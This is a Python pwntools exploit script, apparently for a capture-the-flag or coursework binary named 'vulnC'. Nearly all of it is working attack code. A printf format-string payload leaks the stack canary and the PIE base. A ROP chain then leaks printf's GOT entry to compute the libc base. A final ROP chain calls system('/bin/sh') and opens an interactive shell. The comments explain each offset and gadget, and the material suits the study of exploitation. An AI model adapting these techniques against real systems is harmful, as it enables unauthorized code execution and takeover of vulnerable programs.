import pwn
import struct

# vulnC is a 64-bit dynamically linked executable
# It has full RELRO, NX is enabled, PIE is enabled, there is a gdb stack canary, ASLR is turned on

# This exploit involves first, using printf format string vulnerability to leak the pie base address as well as the canary
# Then, we can do a regular ASLR-defeat ROP plt printf call with printf got as parameter and calculate libc base
# Then, we loop back over and send final payload with rop to system('bin/sh')


target = pwn.process('./vulnC')
# pwn.gdb.attach(target, gdbscript='b vuln_func')

#############################################
#### Part 1) Leaking canary and pie base ####
#############################################

# 144 is subtracted from rsp
# 144/8 = 18

# This is what our stack looks like at the time of the gets call:

# [ 17 8 byte buffer chunks ]
# [ 8 byte canary           ]
# [ 8 byte old base ptr     ]
# [ 8 byte return address   ]

# The first 5 things printed, will be the contents of rsi, rdx, rcx, r8, r9
# Then, we will start printing 8-byte values moving down the stack
# So, the canary should be the 5 + 18 = 23rd value printed
# And the return address should be the 5 + 20 = 25th value printed 

# sending %23$p.%25$p to the executable a couple of times helps us confirm we have the right values:
# We see that the canary always ends in 00, which is a good sign
# We see that the first two, and last three values of the return address are always the same

# Moreover, the last three values of the return address are always 2da
# This is also the last three values of the address of the instruction right after the call to vuln_func
# That address is 0x00005555555552da. The address of the start of the first section in vmmap is 0x0000555555554000
# This means that the offset is in fact 0x12da
# So, if we subtract 0x12da from the value, we probably have the pie base address of the executable

payload1 = b'%23$p.%25$p.'

target.recvuntil(b'first String: \n')
target.sendline(payload1)

raw_canary = target.recvuntil(b'.')
raw_canary = raw_canary.strip(b'.')
canary = int(raw_canary.decode(), 16)
canary = struct.pack("<Q", canary)

raw_pieleak = target.recvuntil(b'.')
raw_pieleak = raw_pieleak.strip(b'.')
pie_retleak = int(raw_pieleak.decode(), 16)
pie_base = pie_retleak - 0x12da

print(f"canary: {raw_canary}, pie base: {hex(pie_base)}")


################################################
#### Part 2) ROPing to leak printf got addr ####
################################################

target_elf = pwn.ELF('vulnC')

# pop rdi gadget: 0x0000000000001353
pop_rdi = struct.pack("<Q", pie_base + 0x1353)
ret_padding = struct.pack("<Q", pie_base + 0x1353 + 1)

# printf plt
printf_plt = struct.pack("<Q", pie_base + target_elf.symbols['printf'])

# printf got
printf_got = struct.pack("Q", pie_base + target_elf.got['printf'])

# main address
main_addr = struct.pack("<Q", pie_base + 0x12c4) # 0x12c4 is the offset to main() found with 'info functions' in gdb

payload2 = b'a' * 136
payload2 += canary
payload2 += b'b' * 8 # previous frame base ptr
payload2 += pop_rdi
payload2 += printf_got
payload2 += printf_plt
payload2 += main_addr # Loop back over

target.sendlineafter(b'second String: \n', payload2)

raw_printf_absolute = target.recv(6) # The address was always 0x00007f... and those leading zeroes don't get printed. So recv(8) was grabbing from the next thing printed
raw_printf_absolute = raw_printf_absolute + b'\0' * (8 - len(raw_printf_absolute))
printf_absolute = struct.unpack("<Q", raw_printf_absolute)[0]

#################################################################
#### Part 3) Calculating libc base and sending final payload ####
#################################################################

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

printf_libc_offset = libc_elf.symbols['printf']

libc_base = printf_absolute - printf_libc_offset

print(f"libc printf: {hex(printf_absolute)}")
print(f"libc base: {hex(libc_base)}")

libc_system_offset = libc_elf.symbols['system']
libc_system = struct.pack("<Q", libc_base + libc_system_offset)


# /bin/sh string in libc:
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
libc_bin_sh_offset = 0x1b45bd
libc_bin_sh = struct.pack("<Q", libc_base + libc_bin_sh_offset)

payload3 = b'a' * 136
payload3 += canary
payload3 += b'b' * 8
payload3 += pop_rdi
payload3 += libc_bin_sh
payload3 += ret_padding
payload3 += libc_system

target.recvuntil(b'first String: \n')
target.sendline(b'a')
target.recvuntil(b'second String: \n')
target.sendline(payload3)

target.interactive()



